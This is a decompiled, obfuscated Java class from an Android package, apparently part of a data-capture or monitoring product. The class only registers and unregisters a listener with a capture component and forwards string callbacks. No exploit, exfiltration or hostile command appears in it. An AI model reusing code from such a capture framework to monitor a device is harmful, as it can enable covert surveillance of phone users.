package com.vvt.al.c;

import android.content.Context;
import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.c.f;

public class b
  implements e, i
{
  private static final boolean a = a.a;
  private boolean b = false;
  private i c;
  private f d;
  
  public b(String paramString1, com.vvt.n.a.b paramb, Context paramContext, String paramString2)
  {
    f localf = f.a(paramb, paramString1, paramContext, paramString2);
    this.d = localf;
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a();
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.b;
    if (!bool)
    {
      bool = true;
      this.b = bool;
      this.c = parami;
      f localf = this.d;
      if (localf != null)
      {
        localf = this.d;
        localf.a(this);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.b;
    if (bool)
    {
      this.b = false;
      bool = false;
      this.c = null;
      f localf = this.d;
      if (localf != null)
      {
        localf = this.d;
        localf.b(this);
      }
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/MyUncaughtExceptionHandler/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */